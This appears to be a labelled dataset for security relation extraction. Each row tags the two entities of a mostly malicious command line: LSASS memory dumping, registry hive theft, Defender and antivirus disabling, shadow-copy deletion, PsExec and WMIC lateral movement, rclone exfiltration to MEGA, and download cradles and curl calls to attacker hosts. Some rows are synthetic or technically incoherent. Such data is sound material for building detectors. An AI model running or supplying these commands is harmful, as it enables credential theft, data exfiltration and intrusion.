process-process-inject(e1,e2)	powershell.exe <e1>dllinjector.exe</e1> -p <e2>explorer.exe</e2> -d payload.dll
process-process-fork(e1,e2)	<e1>cmd_3.exe</e1> /c <e2>echo</e2> %USERNAME% >> C:\output\users_3.txt
process-process-inject(e1,e2)	<e1>wmic.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>svchost.exe</e2>
process-file-chmod(e1,e2)	cmd.exe <e1>icacls</e1> <e2>/var/tmp/hide.so</e2> /grant Everyone:F
process-socket-send(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>wmic</e1> <e2>/node:""REDACTED""</e2> /user:""USER"" /password:""REDACTED"" os get caption"
process-file-read(e1,e2)	<e1>cmd.exe</e1> /q /c upload c:\users\<user>\documents\<doc> <e2>/home/kali/desktop/<doc></e2> 1> \\127.0.0.1\admin$\<num>.<num> 2>&1
process-socket-send(e1,e2)	"<e1>wmic</e1> <e2>/node:""<redacted>""</e2> process call create ""cmd"" /c c:\perflogs\procdump.exe -accepteula -ma lsass c:\perflogs\lsass.dmp"
process-file-write(e1,e2)	<e1>ftp_73.exe</e1> -s:script_73.txt <e2>C:\inetpub\wwwroot\ftp_73.log</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>Remove-Item</e2> /tmp/malware.sh -Force
process-file-write(e1,e2)	<e1>c:\windows\system32\reg.exe</e1> add hklm\software\microsoft\windows nt\currentversion\image file execution options\taskmgr.exe /v debugger /t reg_sz /d <e2>c:\system</e2>
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>python3</e2> -m http.server 8080 --bind 10.10.10.10:4444
process-file-write(e1,e2)	<e1>adfind</e1> -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > <e2>some.csv</e2>
process-file-unlink(e1,e2)	svchost.exe <e1>Remove-Item</e1> <e2>/tmp/malware.sh</e2> -Force
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>taskkill</e2> /IM svchost.exe /F
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>net</e2> group ""enterprise admins"" /domain"
process-file-write(e1,e2)	<e1>notepad_52.exe</e1> <e2>C:\Users\test\notes_52.txt</e2>
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe <e1>wmiexec.exe</e1> <e2>:NTLM_HASH domain_admind@dc_ip</e2>
process-file-write(e1,e2)	<e1>C:\programdata\procdump64.exe</e1> -accepteula -ma lsass.exe <e2>C:\ProgramData\lsass.dmp</e2>
process-file-read(e1,e2)	<e1>adfind.exe</e1> -gcb -sc <e2>trustdmp</e2> > ad_trustdmp.txt
process-file-read(e1,e2)	wmic.exe <e1>dllinjector.exe</e1> -p svchost.exe -d <e2>payload.dll</e2>
process-file-write(e1,e2)	"reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d <e1>""reg.exe</e1> save hklm\security <e2>c:\ProgramData\security.save""</e2> /f"
process-file-read(e1,e2)	"PsExec.exe /accepteula @comps1.txt -u ""domain.local\Administrator"" -p ""REDACTED"" <e1>cmd</e1> /c COPY <e2>""\\REDACTED\share$\ds.exe""</e2> ""%WINDIR%\temp"""
process-file-read(e1,e2)	<e1>notepad_63.exe</e1> <e2>C:\Users\admin\notes_63.txt</e2>
process-file-write(e1,e2)	"<e1>New-ItemProperty</e1> -Path <e2>""HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender""</e2> -Name DisableAntiSpyware -Value 1 -PropertyType DWORD -Force"
process-file-read(e1,e2)	"wmic /node:""[TARGET IP]"" /user:""[DOMAIN]\[USER]"" /password:""[PASSWORD]"" process call create <e1>""cmd.exe</e1> /c <e2>c:\windows\temp\p.bat""</e2>"
process-process-fork(e1,e2)	<e1>wmic</e1> /node:REDACTED /user:DOMAIN\USER /password:REDACTED process call create <e2>cmd.exe</e2> /c copy \\REDACTED\c$\windows\temp\p.bat c:\windows\temp
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server""</e2> /t REG_DWORD /v ""AllowTSConnections"" /d 1 /f"
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>taskkill</e2> /IM svchost.exe /F
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>curl</e2> -X POST --data 'ping' https://evil.server/payload
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>attrib</e2> +s +h /usr/local/bin/backdoor
process-file-chmod(e1,e2)	rundll32.exe <e1>chmod</e1> 777 <e2>/tmp/malware.sh</e2>
Other	rclone.exe copy <e1>\\REDACTED\Shares</e1> <e2>mega:Shares</e2> -q --ignore-existing --auto-confirm --multi-thread-streams 4 --transfers 4
process-file-write(e1,e2)	"<e1>net</e1> localgroup <e2>""Remote Desktop Users""</e2> WDAGUtilityAccount2 /add"
process-socket-receive(e1,e2)	cmd.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind 10.10.10.10:4444
process-process-inject(e1,e2)	<e1>rundll32.exe</e1> Set-ProcessInjection -Target <e2>explorer.exe</e2>
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork 10.10.10.10:4444
process-file-read(e1,e2)	<e1>powershell_15.exe</e1> Get-Content <e2>C:\Users\Public\secrets_15.txt</e2>
process-process-inject(e1,e2)	<e1>rundll32.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>winlogon.exe</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /Q /c <e2>expand</e2> cache.cab -F:* c:\programdata 1> \\127.0.0.1\ADMIN$\____REDACTED 2>&1
process-process-inject(e1,e2)	svchost.exe <e1>dllinjector.exe</e1> -p <e2>explorer.exe</e2> -d payload.dll
process-socket-send(e1,e2)	"<e1>psexec.exe</e1> <e2>\\[TARGET IP]</e2> -u [DOMAIN]\[USER] -p ""[PASSWORD]"" -s -d -h -r mstdc -accepteula -nobanner c:\windows\temp\p.bat"
process-file-write(e1,e2)	cmd.exe /c <e1>reg.exe</e1> save hklm\system <e2>c:\users\REDACTED\appdata\local\temp\1\mkffdg</e2>
process-process-unlink(e1,e2)	<e1>cmd.exe</e1> kill $(Get-Process <e2>svchost.exe.Id)</e2>
process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""McAfee Endpoint Security Platform"" call uninstall /nointeractive"
process-file-exec(e1,e2)	"start PsExec.exe -accepteula -d @C:\share$\comps5.txt -u ""domain\User"" -p ""$PASSWORD"" <e1>cmd</e1> /c <e2>""C:\windows\temp\fQumH.exe""</e2>"
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>powershell.exe</e2> -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://104.243.33.50:80/a'))"""
process-process-fork(e1,e2)	"<e1>schtasks</e1> /create /ru SYSTEM /sc ONSTART /tn Update2 /tr ""cmd /c rundll32 %PUBLIC%\music\svcmc.dll, MainFunc"" <e2>schtasks</e2> /run /TN Update2"
process-file-read(e1,e2)	"<e1>rundll32.exe</e1> ""C:\Users\REDACTED\AppData\Local\Temp\rate_x32.dat"" ,update <e2>/i:""LaborBetray\license.dat""</e2>"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>vssadmin.exe</e2> Delete Shadows /all /quiet
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>net</e2> group ""domain admins"" /domain"
process-file-unlink(e1,e2)	wmic.exe <e1>rm</e1> <e2>C:\ProgramData\updater.exe</e2>
process-process-inject(e1,e2)	<e1>procdump64.exe</e1> -accepteula -ma <e2>lsass.exe</e2> C:\ProgramData\lsass.dmp
process-file-exec(e1,e2)	"<e1>""%PUBLIC%\Music\rclone.exe""</e1> copy <e2>E:\REDACTED\customers</e2> ftp1:REDACTED/customers -q --ignore-existing --REDACTED-confirm --multi-thread-streams 12 --transfers 12 --no-console"
process-process-inject(e1,e2)	<e1>powershell.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>svchost.exe</e2>
process-process-unlink(e1,e2)	<e1>cmd.exe</e1> Stop-Process -Name <e2>svchost.exe</e2> -Force
Other	<e1>C:\Windows\system32\cmd.exe</e1> /C 7za.exe a -tzip -mx5 c:\programdata\lsass.zip <e2>c:\programdata\lsass.dmp</e2>
process-file-write(e1,e2)	<e1>net</e1> localgroup <e2>administrators</e2> localadmin /add
process-process-fork(e1,e2)	<e1>powershell.exe</e1> runas /user:admin <e2>rundll32.exe</e2>
process-file-read(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>wmic</e1> /namespace:\\root\SecurityCenter2 PATH <e2>AntiVirusProduct</e2> GET /value
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>nc</e2> -lvp 4444 -s 192.168.1.100:8080
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>Remove-Item</e2> C:\Users\Public\runme.bat -Force
process-process-fork(e1,e2)	"<e1>psexec</e1> \\<redacted> -u <redacted>\<redacted> -p <redacted> <e2>reg</e2> add ""hklm\system\currentcontrolset\control\lsa"" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0"
process-file-chmod(e1,e2)	svchost.exe <e1>attrib</e1> +s +h <e2>/var/tmp/hide.so</e2>
process-file-read(e1,e2)	"<e1>rclone.exe</e1> copy <e2>""\\[FILE SERVER]\human resources""</e2> MEGA:domain -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12"
process-file-exec(e1,e2)	<e1>rundll32_38.exe</e1> <e2>shell32.dll,Control_RunDLL</e2> C:\Temp\config.ini
process-file-read(e1,e2)	cmd.exe /C <e1>dir</e1> <e2>*.txt</e2>
process-socket-receive(e1,e2)	<e1>tasklist</e1> /S <e2><IP of remote host></e2>
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe <e1>secretsdump.exe</e1> -hashes :[HASH REDACTED] <e2>[USERNAME REDACTED]@[IP ADDRESS REDACTED]</e2>
process-file-write(e1,e2)	"<e1>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</e1> -Command ""(New-Object Net.WebClient).DownloadFile('http://msa.org.in/app/webroot/js/kcfinder/js/AdFind.bin', <e2>'c:\Users\Public\adfind.exe'</e2>"
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>curl</e2> -X POST --data 'ping' http://attacker.com/c2
process-file-exec(e1,e2)	<e1>svchost.exe</e1> -exec <e2>/var/tmp/hide.so</e2>
process-file-read(e1,e2)	svchost.exe <e1>dllinjector.exe</e1> -p notepad.exe -d <e2>payload.dll</e2>
process-process-unlink(e1,e2)	rundll32.exe <e1>taskkill</e1> /IM <e2>explorer.exe</e2> /F
process-socket-send(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>powershell.exe</e1> -nop -w hidden -c <e2>""IEX ((new-object net.webclient).downloadstring('http://104.243.33.50:80/a'))""</e2>"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /q /c download <e2>c:\users\<user>\documents\<doc></e2> /home/kali/desktop/<doc> 1> \\127.0.0.1\admin$\<num>.<num> 2>&1
process-file-exec(e1,e2)	<e1>rundll32.exe</e1> <e2>c:\programdata\95.dll,TstSec</e2> 11985756
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>7za.exe</e2> a -tzip -mx5 c:\programdata\lsass.zip c:\programdata\lsass.dmp
process-file-write(e1,e2)	<e1>mshta_14.exe</e1> -write <e2>C:\Users\Public\hta_payload_14.hta</e2>
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection""</e2> /v ""DisableIOAVProtection"" /t REG_DWORD /d 0x1 /f"
process-socket-send(e1,e2)	<e1>nuclei</e1> -l co_nic_gov -o co_nic_gov_proxy_output -s critical -proxy <e2>socks5://localhost:1080</e2>
Other	"<e1>wmic</e1> /node:""<IP ADDRESS>"" /user:""<DOMAIN>\Administrator"" /password:""<PASSWORD>"" process call create ""cmd.exe /c <e2>c:\windows\temp\ttsel.exe""</e2>"
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>Remove-Item</e2> C:\Windows\Temp\evil.dll -Force
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender\Reporting""</e2> /v ""DisableEnhancedNotifications"" /t REG\_DWORD /d ""1"" /f"
process-socket-receive(e1,e2)	wmic.exe <e1>python3</e1> -m http.server 8080 --bind <e2>192.168.1.100:8080</e2>
process-file-unlink(e1,e2)	cmd.exe <e1>del</e1> <e2>C:\Windows\Temp\evil.dll</e2>
process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""AVG 2015""</e2> call uninstall /nointeractive"
process-file-exec(e1,e2)	"<e1>wmic.exe</e1> -Command ""Start-Process <e2>/usr/local/bin/backdoor""</e2>"
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>curl</e2> -X POST --data 'ping' http://attacker.com/c2
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>icacls</e2> /tmp/malware.sh /grant Everyone:F
process-process-fork(e1,e2)	"<e1>C:\Windows\System32\cmd.exe</e1> /c <e2>echo</e2> curl https://moashraya[.]com/out/t.php --output ""%temp%\magni.waut.a"" --ssl no-revoke --insecure --location > %temp%\magni.w.bat"
process-file-read(e1,e2)	"<e1>powershell_46.exe</e1> -Command ""gc <e2>C:\ProgramData\conf_46.yaml""</e2>"
process-process-inject(e1,e2)	<e1>svchost.exe</e1> dllinjector.exe -p <e2>svchost.exe</e2> -d payload.dll
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>ping</e1> <e2>http://<IP redacted>/</e2>
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeam.backup.manager.exe</e2> /F
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>Remove-Item</e2> C:\ProgramData\updater.exe -Force
process-file-write(e1,e2)	"<e1>find.exe</e1> -f ""(objectcategory=person)"" > <e2>ad_users.txt</e2>"
process-socket-receive(e1,e2)	rundll32.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>https://evil.server/payload</e2>
process-process-fork(e1,e2)	"<e1>python.exe</e1> <e2>powershell</e2> -c ""Invoke-RestMethod -Uri http://attacker.com/c2 -Body 'cmd=whoami'"""
process-file-write(e1,e2)	<e1>adfind.exe</e1> -sc dclist > <e2>dclist.txt</e2>
process-file-unlink(e1,e2)	python.exe <e1>rm</e1> <e2>/var/tmp/hide.so</e2>
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet""</e2> /v ""SubmitSamplesConsent"" /t REG_DWORD /d 0x2 /f"
process-process-unlink(e1,e2)	<e1>wmic.exe</e1> Stop-Process -Name <e2>notepad.exe</e2> -Force
process-file-exec(e1,e2)	"<e1>wmic.exe</e1> -Command ""Start-Process <e2>/tmp/malware.sh""</e2>"
process-file-write(e1,e2)	"wmic /node:""<redacted>"" process call create ""cmd"" /c <e1>c:\perflogs\procdump.exe</e1> -accepteula -ma lsass <e2>c:\perflogs\lsass.dmp</e2>"
process-file-chmod(e1,e2)	wmic.exe <e1>chmod</e1> 777 <e2>C:\Windows\Temp\evil.dll</e2>
process-file-write(e1,e2)	cmd_84.exe /c <e1>echo</e1> %USERNAME% >> <e2>C:\output\users_84.txt</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>C:\ProgramData\AnyDesk.exe</e2> --install C:\ProgramData\Any --start-with-win --silent
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeamtransportsvc.exe</e2> /F
process-file-write(e1,e2)	c:\windows\system32\cmd.exe /c <e1>fsutil</e1> behavior set <e2>symlinkevaluation</e2> r2l:1
process-file-read(e1,e2)	<e1>ftp_92.exe</e1> <e2>-s:script_92.txt</e2> C:\inetpub\wwwroot\ftp_92.log
process-process-unlink(e1,e2)	<e1>taskkill</e1> /f /im <e2>SafeDogSiteIIS.exe</e2>
process-file-write(e1,e2)	<e1>find.exe</e1> -subnets -f (objectCategory=subnet)> <e2>subnets.txt</e2>
process-file-read(e1,e2)	<e1>adfind.exe</e1> -sc <e2>trustdmp</e2>
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>taskkill</e2> /IM taskmgr.exe /F
process-file-write(e1,e2)	"PsExec.exe /accepteula @comps1.txt -u ""domain.local\Administrator"" -p ""REDACTED"" <e1>cmd</e1> /c COPY <e2>""\\REDACTED\share$\ds.exe""</e2> %WINDIR%\temp"
process-process-fork(e1,e2)	<e1>C:\programdata\procdump64.exe</e1> -accepteula -ma <e2>lsass.exe</e2> C:\ProgramData\lsass.dmp
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>Remove-Item</e2> C:\Windows\Temp\evil.dll -Force
process-process-fork(e1,e2)	<e1>torify</e1> <e2>nuclei</e2> -l large_scope -o large_scope -as
process-file-exec(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>rundll32</e1> <e2>C:\Windows\system32\SQL.dll</e2>, StartW
process-file-unlink(e1,e2)	rundll32.exe <e1>Remove-Item</e1> <e2>C:\Windows\Temp\evil.dll</e2> -Force
process-file-write(e1,e2)	cmd_18.exe /c <e1>echo</e1> malicious > <e2>C:\Temp\evil_18.bat</e2>
process-process-inject(e1,e2)	<e1>cmd.exe</e1> dllinjector.exe -p <e2>svchost.exe</e2> -d payload.dll
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>attrib</e2> +s +h C:\Users\Public\runme.bat
process-socket-send(e1,e2)	"wmic.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>http://attacker.com/c2</e2> -Body 'cmd=whoami'"""
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>powershell</e2> Start-Process rundll32.exe
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> <e2>wmiexec.exe</e2> :NTLM_HASH domain_admind@dc_ip
process-file-read(e1,e2)	"start PsExec.exe -accepteula @C:\share$\comps1.txt -u ""domain\User"" -p ""$PASSWORD"" <e1>cmd</e1> /c COPY <e2>""\\DOMAINCONTROLLER\share$\fQumH.exe""</e2> ""C:\windows\temp"""
process-process-fork(e1,e2)	<e1>adfind.exe</e1> -subnets -f (objectCategory=subnet) > <e2>ad_subnets.txt</e2>
process-process-inject(e1,e2)	<e1>powershell.exe</e1> Set-ProcessInjection -Target <e2>lsass.exe</e2>
process-file-read(e1,e2)	"<e1>net</e1> group <e2>""domain admins""</e2> /dom"
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList""</e2> /t REG_DWORD /f /d 0 /v Support"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork http://attacker.com/c2
process-file-read(e1,e2)	"PsExec.exe -d \\HOST -u ""DOMAIN\USER"" -p ""PASSWORD"" -accepteula -s cmd /c <e1>""powershell.exe</e1> -ExecutionPolicy Bypass -file <e2>\\DOMAINCONTROLLER\share$\p.ps1""</e2>"
process-file-chmod(e1,e2)	python.exe <e1>chmod</e1> 777 <e2>/tmp/malware.sh</e2>
process-file-exec(e1,e2)	<e1>cmd.exe</e1> /c start <e2>C:\Windows\Temp\evil.dll</e2>
process-file-exec(e1,e2)	<e1>psexec.exe</e1> \\<IP ADDRESS> -u <DOMAIN>\Administrator -p <PASSWORD> -s -d -h -r mstdc -accepteula -nobanner <e2>c:\windows\temp\ttsel.exe</e2>
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork https://evil.server/payload
process-file-exec(e1,e2)	<e1>rundll32.exe</e1> -exec <e2>/tmp/malware.sh</e2>
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /Q /c <e2>schtasks.exe</e2> /create /sc onlogon /tn ""Wow64 Subsystem"" /rl highest /tr ""%%programdata%%\schcache\mswow86.exe"
process-file-chmod(e1,e2)	python.exe <e1>attrib</e1> +s +h <e2>C:\Users\Public\runme.bat</e2>
process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""McAfee VirusScan Enterprise""</e2> call uninstall /nointeractive"
process-file-read(e1,e2)	wmic /node:REDACTED /user:DOMAIN\USER /password:REDACTED process call create <e1>cmd.exe</e1> /c copy <e2>\\REDACTED\c$\windows\temp\p.bat</e2> c:\windows\temp
process-file-exec(e1,e2)	<e1>cmd.exe</e1> -c <e2>\\<domain controller>\netlogon\<num>.exe</e2>
process-socket-receive(e1,e2)	wmic.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>192.168.1.100:8080</e2>
process-file-read(e1,e2)	<e1>notepad_71.exe</e1> <e2>C:\Users\admin\notes_71.txt</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>echo</e2> xgxfpw > \\.\pipe\xgxfpw
process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""McAfee DLP Endpoint""</e2> call uninstall /nointeractive"
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>python3</e2> -m http.server 8080 --bind https://evil.server/payload
process-file-exec(e1,e2)	<e1>pse.exe</e1> -accepteula @a.txt -c -f -d -s <e2>ufo.exe</e2> > log.txt
process-file-read(e1,e2)	"<e1>psexec.exe</e1> \\TARGET_HOST_IP -u DOMAIN\USER -p ""PASSWORD"" -s -d -h -r mstdc -accepteula -nobanner <e2>c:\windows\temp\p.bat</e2>"
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>chmod</e2> 777 C:\Windows\Temp\evil.dll
process-file-read(e1,e2)	<e1>notepad_51.exe</e1> <e2>C:\Users\admin\notes_51.txt</e2>
process-process-fork(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>wmic</e1> /node:""REDACTED"" process call create <e2>""c:\windows\system32\rundll32.exe</e2> c:\windows\temp\1.dll, DllRegisterServer‘"
process-socket-send(e1,e2)	svchost.exe <e1>curl</e1> -X POST --data 'ping' <e2>192.168.1.100:8080</e2>
process-file-read(e1,e2)	<e1>reg_33.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
process-file-read(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>net</e1> localgroup <e2>Administrators</e2>
process-file-write(e1,e2)	"reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce /v *a /t REG_SZ /d <e1>""cmd.exe</e1> /c <e2>C:\<REDACTED-COMPANY-NAME>.exe""</e2> /f"
process-socket-send(e1,e2)	"<e1>VeeamHax.exe</e1> --verbose --target <e2><backup server></e2> --port 9401 --cmd ""c:\windows\notepad.exe"" --sql ""EXEC sp\_configure 'show advanced options', '1'"""
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>del</e2> /tmp/malware.sh
process-socket-send(e1,e2)	"<e1>VeeamHax.exe</e1> --verbose --target <e2><backup server></e2> --port 9401 --cmd ""c:\windows\notepad.exe"" --sql ""EXEC sp\_configure 'xp\_cmdshell', '1' """
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>wmic</e2> /node:""ENDPOINT"" process call create C:\test.exe"
process-process-inject(e1,e2)	<e1>python.exe</e1> Set-ProcessInjection -Target <e2>lsass.exe</e2>
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>rm</e2> /tmp/malware.sh
process-file-exec(e1,e2)	"<e1>schtasks</e1> /create /ru SYSTEM /tn ""OneDrive Security Task-S-1-5-21-REDACTED"" /tr <e2>c:\windows\adfs\py\UpdateEdge.bat</e2> /SC ONSTART /F"
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>reg.exe</e2> save hklm\system c:\ProgramData\system.save
process-file-write(e1,e2)	"<e1>adfind.exe</e1> -f ""(objectcategory=person)"" > <e2>ad_users.txt</e2>"
process-file-chmod(e1,e2)	cmd.exe <e1>attrib</e1> +s +h <e2>C:\Windows\Temp\evil.dll</e2>
